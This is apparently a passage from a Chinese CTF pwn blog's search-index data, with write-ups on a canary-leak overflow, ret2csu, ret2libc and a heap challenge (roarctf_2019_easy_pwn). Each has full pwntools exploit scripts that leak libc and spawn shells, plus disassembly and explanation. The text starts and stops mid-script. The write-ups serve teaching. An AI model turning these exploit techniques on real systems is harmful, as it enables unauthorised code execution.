system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29125elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#main_addr = elf.sym[&#x27;main&#x27;]main_addr = 0x400908io = remoteconnect(ip,port)#io = process(&quot;./pwn&quot;)debug(1)puts_plt = 0x400690rdi_addr = 0x400a93puts_got = elf.got[&#x27;puts&#x27;]leave_addr = 0x400824io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x87)+b&quot;1&quot;io.sendline(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recvuntil(&quot;1&quot;)canary = u64(io.recv(8).ljust(8,b&quot;\\x00&quot;))-0xaio.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x98)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recv(0x98)start_addr = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = start_addr - 240 - libc.sym[&#x27;__libc_start_main&#x27;]#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf1147io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = b&quot;a&quot;*0x88+p64(canary)+p64(0xabcdabcd)+p64(onegadget_addr)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.send(b&quot;3&quot;)io.interactive()\n\n不过这题不知道为啥 read函数虽然对输入的数据进行了限制 但是好像还是可以超额输入 原理暂时还不清楚 留个坑\n所以这题可以用构造rop链 泄露libc基址\nfrom pwn import *from LibcSearcher import *#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)p=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;#泄露canaryp.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)payload=&#x27;a&#x27;*(0x80+8)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)p.recvuntil(&#x27;a\\n&#x27;)canary=u64(p.recv(7).rjust(8,b&#x27;\\x00&#x27;))pop_rdi=0x400a93puts_got=elf.got[&#x27;puts&#x27;]puts_plt=0x400690main_addr=0x400908payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)p.sendline(payload)\n\npayload总长明显是超过0x100的 但是gdb动调看了一下 确实是能写进去的\n\n你直接打断点是看不到这些栈的内容的 这一段在高地址处 因为是之前执行过的栈\n所以你需要用 set $rsp &#x3D; $rsp - 0x68来调整一下rsp寄存器的位置 因为stack是以sp寄存器为0来延申的\n这里还有一点是要注意的 此时我们一直是在while循环中 在执行完一连串的指令后 并不会跳转到返回地址 因为这并不属于一个栈帧的结束 从栈上的地址逐渐降低也可以看出来 所以我们需要手动退出while循环\n剩下的就没什么好说的了 完整exp：\nfrom pwn import *from LibcSearcher import *#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)p=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;#泄露canaryp.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)payload=&#x27;a&#x27;*(0x80+8)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)p.recvuntil(&#x27;a\\n&#x27;)canary=u64(p.recv(7).rjust(8,b&#x27;\\x00&#x27;))pop_rdi=0x400a93puts_got=elf.got[&#x27;puts&#x27;]puts_plt=0x400690main_addr=0x400908payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)p.sendline(payload)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;3&#x27;)p.recv()puts_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(binsh)+p64(system)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)p.interactive()\n\n","categories":["wp"]},{"title":"ret2csu","url":"/2022/09/25/ret2csu/","content":"我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接\n不一定有那么刚好的汇编代码可以供我们构造rop链\n今天我们了解的这种方法，将不受动态链接或者静态链接的限制\n我们今天的主角就是libc_csu_init函数，其作用是对libc进行初始化，由于绝大多数的程序都会调用函数，所以libc_csu_init是一定存在的(对于调用函数的程序而言)\n那么这个函数究竟有什么奇效，让我们可以做到随意构造rop链呢？\n来看看在ida中，这个函数是什么样子的\n.text:00000000004011B0 ; void _libc_csu_init(void).text:00000000004011B0                 public __libc_csu_init.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o.text:00000000004011B0 ; __unwind &#123;.text:00000000004011B0                 push    r15.text:00000000004011B2                 mov     r15, rdx.text:00000000004011B5                 push    r14.text:00000000004011B7                 mov     r14, rsi.text:00000000004011BA                 push    r13.text:00000000004011BC                 mov     r13d, edi.text:00000000004011BF                 push    r12.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry.text:00000000004011C8                 push    rbp.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004011D0                 push    rbx.text:00000000004011D1                 sub     rbp, r12.text:00000000004011D4                 sub     rsp, 8.text:00000000004011D8                 call    _init_proc.text:00000000004011DD                 sar     rbp, 3.text:00000000004011E1                 jz      short loc_4011FE.text:00000000004011E3                 xor     ebx, ebx.text:00000000004011E5                 nop     dword ptr [rax].text:00000000004011E8.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j.text:00000000004011E8                 mov     rdx, r15.text:00000000004011EB                 mov     rsi, r14.text:00000000004011EE                 mov     edi, r13d.text:00000000004011F1                 call    qword ptr [r12+rbx*8].text:00000000004011F5                 add     rbx, 1.text:00000000004011F9                 cmp     rbp, rbx.text:00000000004011FC                 jnz     short loc_4011E8.text:00000000004011FE.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j.text:00000000004011FE                 add     rsp, 8.text:0000000000401202                 pop     rbx.text:0000000000401203                 pop     rbp.text:0000000000401204                 pop     r12.text:0000000000401206                 pop     r13.text:0000000000401208                 pop     r14.text:000000000040120A                 pop     r15.text:000000000040120C                 retn.text:000000000040120C ; &#125; // starts at 4011B0.text:000000000040120C __libc_csu_init endp\n\n我们的目光聚集到loc_4011FE和loc_4011E8\n我们暂且把loc_4011E8命名为gadget1，把loc_4011FE命名为gadget2\n由于逻辑顺序的原因，所以我们这里先介绍gadget1\n可以看到他先将rsp的位置增加8个字节，这8个字节尤为关键，我们下面再进行解释\n接着他pop了多个寄存器，但是仍然没有我们需要的rdi和rsi，不过先别急，再往下想想\n最后一行有个retn，我们可以利用这个ret将返回地址修改为gadget2，用意在你看完整个的流程分析后就会明白\n再把目光看到gadget2\nmov指令将r15和r14以及r13的数据分别传给了寄存器rdx，rsi和edi，这样子实际上就实现了我们要调用函数首先要做到的传参\n这里解释一下edi，我们之前不是说过在64位的情况下，是r开头的吗，其实情况也不是绝对的\n64位情况下的edi只能改写rdi低32位字节的数据，高32位的字节是无法更改的，不过此时rdi的高32位的数据为0，并不影响我们更改rdi的值\n接下来的call指令就是重头戏，可以看到他call的值是r12+rbx*8\n有没有一种可能，如果我们把rbx赋值为0，而把r12赋值为我们想要执行的函数地址(为什么不反过来，一是*8转化不方便，还有一个原因下面讲到)，那么我们就可以实现函数调用\n接着对rbx进行了+1的操作 而我们上面讲到，我们准备把rbx的值设置为0，所以此时的rbx就为1\ncmp对于rbx和rbp二者进行了对比，如果二者相同，则不进行下一条指令，也就是jnz的跳转，即重新执行一次刚才的汇编代码\n所以此时我们需要将rbp的值设置为1，才能使其于rbx相等\n收回思绪，我们接着想，程序执行完gadget2后会怎么样？\n其实没有多高深的想法，他会按照顺序接着执行下去，那么又回到了我们的gadget1\n接下来，由于我们已经实现了我们想要的寄存器传参，所以此时的寄存器是什么值我们已经不在乎了\n我们可以简单的用cyclic(8*7)简单的实现填充垃圾数据，然后在末尾的ret在自行决定我们接下来要返回的地址\n缕清楚了整个__libc_csu_init函数的思路，我们来回顾一下刚才提出的问题，rsp+8会怎么影响我们的程序，我们来用图表示一下栈结构试试看\n\n第一行和第二行以及第三行没有什么好解释的 常规的栈溢出 然后控制返回地址使程序返回到libc_csu_init函数\n此时的sp指针，是指向到了add rsp+8这行汇编代码，+8即让其继续向栈顶增进了一个字长，所以此时我们要在add rsp+8该行汇编代码处填充的数值，可以是任何，即垃圾数据\n那么，总结一下，我们可以得出一个通用的payload\npayload = offset * &#x27;a&#x27;  #栈溢出的垃圾数据字节数payload += p64(gagdet2_addr) + &#x27;a&#x27; * 8    #gadgets2的地址payload += p64(0) + p64(1)#rbx=0, rbp=1payload += p64(r12)#call调用的地址payload += p64(r13) + p64(r14) + p64(r15)#三个参数的寄存器payload += p64(gagdet1_addr)#gadgets1的地址payload += &#x27;a&#x27; * 56#第二次pop 由于寄存器是啥数值我们已经不需要了 所以56个字节全部用垃圾数据覆盖payload += p64(last)#函数最后的返回地址\n\n这里还有一点需要注意的 r12这里输入的地址应该是调用函数的got表地址\n具体解释可以看HNCTF2022的一题wp\n","categories":["栈"]},{"title":"ret2libc","url":"/2022/09/23/ret2libc/","content":"前置知识了解随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量\n那么我们还有办法自己构建一个后门函数吗\n不知道还记不记得在最开始的栈溢出那一题，我们提到了plt表和got表\n在当时，为了照顾新手入坑pwn的感受，我们只是粗略的得出plt调用函数，got存真实地址的服务于做题的结论\n现在，让我们解释一下这个结论的原因\n我们先前已经讲过，got表的作用是因为动态链接的存在，为了使应用程序方便的获取libc中的真实地址\n并且只有当程序运行和函数调用过后，got表中保存的才会是该函数的libc的绝对地址\n而plt表虽然引用的也是got表中的真实地址，但是注意这里并不是说明got表能够调用这个函数\nplt表之所以能够调用函数，而got不行的关键原因是因为plt表还起到了把控制(程序执行流)转移到对应的函数\n当然上述的解释并不详细，许多原理性的问题没有讲到，如果将来想要死磕pwn的同学，建议花时间去专研透底层逻辑的问题(当然现在没有必要)\n所以我们是不是可以得出一条逻辑链，当程序没有给予我们现成的后门函数的时候，我们可以通过system的plt表来调用system函数\n但是说的容易做起来难，我们如何获得system函数的plt表地址呢？\n这里我们只需要记住一个公式 真实地址 &#x3D; 基址 + 偏移\n即我们通过puts等函数泄露出来的函数地址是真实地址，我们可以通过计算偏移来求出libc基址\n然后依据libc基址和偏移量得出其他函数的真实地址，从而随意调用\n但是如果我们不了解libc版本，即题目附件并为给出呢\n这里还需要了解一下libc中函数地址偏移的概念\n如果开启了pie保护机制，函数的地址将在每次运行时发生变化\n但是其后三位由于虚拟地址页的映射机制，将不会发生变化(前提是在同一个libc版本中)\n因此，如果题目没有给予我们libc文件的话，我们可以通过函数的后三位来推演出libc版本，从而求得libc基址\nwp演示\n先看一下保护机制，但是看不出什么苗头\n拖到ida里面看看\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[32]; // [rsp+0h] [rbp-20h] BYREF  init(argc, argv, envp);  puts(&quot;Glad to meet you again!What u bring to me this time?&quot;);  fgets(s, 96, stdin);  puts(&quot;Ok.See you!&quot;);  return 0;&#125;\n\n有一个fgets输入任意字节的数据可以用来栈溢出，但是看了下函数列表，好像没有后门函数可以供我们返回\n并且程序也没有提供给我们可以用来泄露函数地址的puts等\n没办法了，我们只能连同puts函数泄露其真实地址一起构造\n看到这里是不是仍然不太明白，看看exp的构造就知道了\n1 from pwn import*   2 io = remote(&quot;node4.buuoj.cn&quot;,28548)3 elf = ELF(&quot;./pwn&quot;)4 libc = ELF(&quot;./libc-2.31.so&quot;)5 io.recvuntil(&quot;Glad to meet you again!What u bring to me this time?&quot;)6 puts_got = elf.got[&#x27;puts&#x27;]7 main_addr = elf.symbols[&#x27;main&#x27;]8 rdi_addr = 0x4007539 ret_addr = 0x40050e10 puts_got = elf.got[&#x27;puts&#x27;]11 puts_plt = elf.plt[&#x27;puts&#x27;]12 payload = cyclic(40)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)13 io.sendline(payload)14 io.recvuntil(&quot;Ok.See you!&quot;)15 puts_addr = u64(io.recvuntil(&quot;\\nGlad to meet you again!What u bring to me this time?\\n&quot;,drop =            True).ljust(8,b&#x27;\\x00&#x27;))16 libc_addr = puts_addr - libc.symbols[&#x27;puts&#x27;]17 system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]18 binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))19 payload = cyclic(40)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)20 io.sendline(payload)21 io.recvuntil(&quot;Ok.See you!&quot;)22 io.interactive()\n\n第四行这里，我们之所以要装载题目附件所给我们的libc-2.31.so文件\n是因为我们需要获取该libc版本的各函数相较于基址的偏移\n同理，这里还有两种办法可以获取(实际上还有三种，但是最后一种我还不会用[截止到文章发布，如果后续学会了将会补上])\n获取libc版本偏移-第一种办法\n\n在该网站 我们可以通过输入对应函数的后3位数值来检索对应的libc版本(比如图中检索到了3个版本，通常是都得试试的)\nlibc database search (blukat.me)\n获取libc版本偏移-第二种办法\nlibcsearch这个工具也能获取偏移\n由于网上对于这个工具的安装和使用不计其数\n这里我只负责介绍这个工具，安装过程如果出现问题可以看看这个博客(3条消息) LibcSearcher的安装使用_Catch_1t_AlunX的博客-CSDN博客\n说回到exp，我们继续往下看，截止到12行的第一个payload都是一些前置的要点获取\ncyclic生成40个字节的垃圾数据这个没有任何难度理解\nrdi寄存器传参这条之前也解释过了，puts_got显然就是将puts函数的真实地址传给rdi\n接下来的puts_plt便是调用puts函数，输出puts函数的真实地址\n接着为什么要返回到main函数？因为我们还需要接收puts的真实地址，并且我们只能输入96个字节的数据，如果一次性构造payload过长则无法成功\n第三个疑点来到了15行，有很多我们没有见过的语法？\nu64，[-6:]，ljust？这些都是什么东西，一个一个讲\nu64&#x2F;u32\n不知道你还记不记得我们之前讲过的bite型，他起到了数据的传输和存储的作用\n你是不是一直有个疑问，为什么我们要用到p64和p32\n实际上p是将括号内的数据打包成二进制字节数据流(可以理解为bite型)\n而如果我们要想接收，并且转化为我们能看懂的数据类型，就需要用到u\n为了方便理解，我们看一下如果没有u64，我们得到的数据会是什么样子\n其作用就是决定recv从倒数第n个字节开始读取\n但是为什么这里是6呢？我们试试4，5，7这些数字会导致什么结果\n这里不知道你发现没有，一个字节对应着两个字符(之前提过了，这里小复习一下)\n并且由于小端序，所以我们从倒数第几个字节开始接收，影响着我们得到的真实地址的后三位\n拜托，这可是致命的错误，后三位错了我们还怎么获得偏移\n通常，函数的真实地址虽然是8字节(64位)，但是由于其头两个字节的数据恒为00 00\n所以我们只需要从倒数第六字节开始读取(反而言之，就是你要从倒8处读也行)\n欸 你说 我偏不要呢 我就不要[-6:]你来帮我限制读入的字节数量\n反正我就8字节的地址呗\n如果你尝试了以后就会报错，为什么？\n因为我们不单单只读入了函数的真实地址，数据传输以及内存地址分配是一个复杂的过程\n而我们将其改为100试试，仍然可以正常读入数据\n但是你会发现在地址结尾处多出来了个0a，实际上他是换行符，这个换行符是哪里来的？\n仔细观察14行 我们在接收的时候，并未一起接收换行符\n这一点说明了什么?修改为100后都能读取倒上一个字符串的数据了，那我们刚刚不还说在函数地址上面，还有很多其他数据呢？\n这里就可以介绍介绍ljust了\nljust\n他的作用就是限制我们读入的字节总数，如果不够的话则以我们设定好的字符填充\n所以我们哪怕[-n:]中的n取到了100也仍然不会报错\n说回exp 在第一个payload输送完以后，我们成功获得函数的真实地址\n接着就是计算偏移然后求得其他函数以及binsh字符串的地址\n还是老办法构造payload，并且这里还需要一个ret来栈对齐\n补充：一点小补充吧 相信会有人和我有一样的疑问，在刚接触到ret2libc的时候\n既然我们都将got表中的puts函数真实地址作为参数存储在了rdi寄存器中输送再接收\n而且获取真实地址的方法只需要一个elf.got就行了\n为什么我们不能直接拿这个地址来进行计算基址呢？\n很简单，我们debug看一下，如果我们直接使用got表中的真实地址，他是一个什么东西\n\n我们再看一下 通过我们上文的办法得到的真实地址长什么样子\n\n可以看到明显不一样\n这是因为got表中保存的值是需要运行过后才会为真实地址，所以我们需要将其打印出来再接收(这里我也有点不太理解，埋个坑，日后填)\n","categories":["栈"]},{"title":"roarctf_2019_easy_pwn","url":"/2023/01/29/roarctf-2019-easy-pwn/","content":"这道堆题比较简单 涉及到的知识点以往的文章都有介绍到 但是最后打malloc_hook的时候由于栈不满足onegadget的条件 所用到的realloc_hook的办法值得拿出来说一说\nchecksec看一下 保护机制全开\n[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nida看一下伪代码\nmain函数很常规 就基于菜单题实现的堆\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v4; // [rsp+4h] [rbp-Ch]  sub_AD0(a1, a2, a3);  while ( 1 )  &#123;    menu();    v4 = recv_data(v4);    switch ( v4 )    &#123;      case 1:        create();        break;      case 2:        puts(&quot;Tell me the secret about you!!&quot;);        edit();        break;      case 3:        delete();        break;      case 4:        show();        break;      case 5:        return 0LL;      default:        puts(&quot;Wrong try again!!&quot;);        break;    &#125;  &#125;&#125;\n\n重点抓edit函数和delete函数出来说 另外这题创建chunk用的是calloc函数 创建chunk的时候会清空chunk内容 使其为0\n__int64 sub_E82()&#123;  int v1; // [rsp+Ch] [rbp-14h]  int v2; // [rsp+Ch] [rbp-14h]  int v3; // [rsp+10h] [rbp-10h]  unsigned int v4; // [rsp+14h] [rbp-Ch]  printf(&quot;index: &quot;);  v2 = recv_data(v1);  v3 = v2;  if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 15 )  &#123;    v2 = *(&amp;chunk_judge + 4 * v2);    if ( v2 == 1 )    &#123;      printf(&quot;size: &quot;);      v2 = recv_data(1);      v4 = compare(*(&amp;chunk_size + 4 * v3), v2);      if ( v2 &gt; 0 )      &#123;        printf(&quot;content: &quot;);        v2 = recv_data2(chunk_point[2 * v3], v4);      &#125;    &#125;  &#125;  return v2;&#125;\n\n根据输入的index来索引bss段数组 如果该index有对应的chunk(即chunk_judge判断成功) 则输入size\n在edit函数输入的size和create chunk时输入的size二者作为compare函数的参数 跟进看一下用来干什么\n__int64 __fastcall sub_E26(int a1, unsigned int a2)&#123;  __int64 result; // rax  if ( a1 &gt; a2 )    return a2;  if ( a2 - a1 == 10 )    LODWORD(result) = a1 + 1;  else    LODWORD(result) = a1;  return result;&#125;\n\n当edit_size-create_size&#x3D;10时 可以供我们多输入一个字节 那么利用四舍五入的机制 就可以做到溢出9个字节\ndelete函数:\n__int64 sub_F8E()&#123;  int v0; // eax  int v2; // [rsp+Ch] [rbp-14h]  int v3; // [rsp+10h] [rbp-10h]  __int64 v4; // [rsp+10h] [rbp-10h]  printf(&quot;index: &quot;);  v0 = recv_data(v3);  v4 = v0;  v2 = v0;  if ( v0 &gt;= 0LL &amp;&amp; v0 &lt;= 15LL )  &#123;    v4 = *(&amp;chunk_judge + 4 * v0);    if ( v4 == 1 )    &#123;      *(&amp;chunk_judge + 4 * v0) = 0;      *(&amp;chunk_size + 4 * v0) = 0;      free(chunk_point[2 * v0]);      chunk_point[2 * v2] = 0LL;    &#125;  &#125;  return v4;&#125;\n\n指针置零了 不存在uaf漏洞\n那么合计一下思路 可以利用覆写chunk size来合并chunk 从而获得free_chunk的指针 这样就可以泄露main_arena的真实地址 从而计算处真实地址\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,28013)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu16_64.so&quot;)def add(size):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))def edit(index,size,content):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;content: &quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr))\n\n这样我们获得了一个free chunk的指针 即chunk2\n可以用其修改fd域 从而获得任意地址写的机会 因为libc版本是2.23 所以这里用malloc_hook_attack\nadd(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))payload = cyclic(0x13)+p64(onegadget_addr)edit(5,len(payload),payload)add(0x10)io.interactive()\n\n按理来说这道题到这里就结束了 但是你会发现几个onegadget都不行 这是因为onegadget所要求的栈空间并不满足的问题\n这时候两种办法 一种是hgame2023的一题中利用到的double free也能触发malloc_hook 详细解释和手法可以去看我对应的wp\n还有一种办法是利用realloc来实现 下面详细介绍一下\nrealloc函数是用于重新分配之前被分配过的chunk空间 其也有realloc_hook 并且也类似于malloc_hook 如果不为0则调用\n关键在于两点 一是realloc_hook和malloc_hook相邻 也意味着我们可以同时修改二者\n第二点在于realloc调用的时候会进行大量的push操作\n.text:00000000000846C0                 public realloc.text:00000000000846C0 realloc         proc near               ; CODE XREF: _realloc↑j.text:00000000000846C0                                         ; DATA XREF: LOAD:0000000000006BA0↑o ....text:00000000000846C0.text:00000000000846C0 var_60          = qword ptr -60h.text:00000000000846C0 var_58          = byte ptr -58h.text:00000000000846C0 var_48          = byte ptr -48h.text:00000000000846C0.text:00000000000846C0 ; __unwind &#123;.text:00000000000846C0                 push    r15             ; Alternative name is &#x27;__libc_realloc&#x27;.text:00000000000846C2                 push    r14.text:00000000000846C4                 push    r13.text:00000000000846C6                 push    r12.text:00000000000846C8                 mov     r13, rsi.text:00000000000846CB                 push    rbp.text:00000000000846CC                 push    rbx.text:00000000000846CD                 mov     rbx, rdi.text:00000000000846D0                 sub     rsp, 38h.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr.text:00000000000846DB                 mov     rax, [rax].text:00000000000846DE                 test    rax, rax.text:00000000000846E1                 jnz     loc_848E8.text:00000000000846E7                 test    rsi, rsi.text:00000000000846EA                 jnz     short loc_846F5.text:00000000000846EC                 test    rdi, rdi.text:00000000000846EF                 jnz     loc_84960\n\n所以可以修改我们的栈空间 使其符合条件(如果可以的话)\n我们先使用gdb动调看一下 onegadget的条件没有被满足时 对应的栈空间\n调试exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25622)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))def edit(index,size,content):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;content: &quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr))add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))payload = cyclic(0xb+0x8)+p64(onegadget_addr)edit(5,len(payload),payload)gdb.attach(io,&#x27;b *$rebase(0xccc)&#x27;)add(0x10)\n\n此时断点打在calloc函数调用时 我们一步步s下去\n\n\n\n此时进行了一个逻辑与操作 如果rax寄存器的值为0 那么逻辑与的结果为1 \n而jne指令当ZF零标志为0的时候 则会跳转 此时rax的值是一个地址 所以会执行jne跳转 我们继续跟进\n\n此时call rax 再次跟进\n\n这一步也就是onegadget判断栈结构的关键了 可以看到esp+0x30处并不等于NULL 所以onegadget执行失败\n那么为什么我们改良后 通过realloc来调整栈结构的payload是\ncyclic(0xb)+p64(onegadget_addr)+p64(realloc_addr+2)\n\n我们来看看malloc_hook内存地址附近的情况\n\n可以看到往低地址偏移0x8处是realloc_hook 这也就意味着如果我们按照上面的payload覆写 那么此时程序的执行流程为\n\n因此凭借着readlloc在执行前会进行的push入栈操作 可以实现栈结构调节\n不过由于本地和远程以及许多因素 建议还是直接试realloc_addr+x的偏移\n完整exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25622)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))def edit(index,size,content):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;content: &quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr))add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))gdb.attach(io)payload = 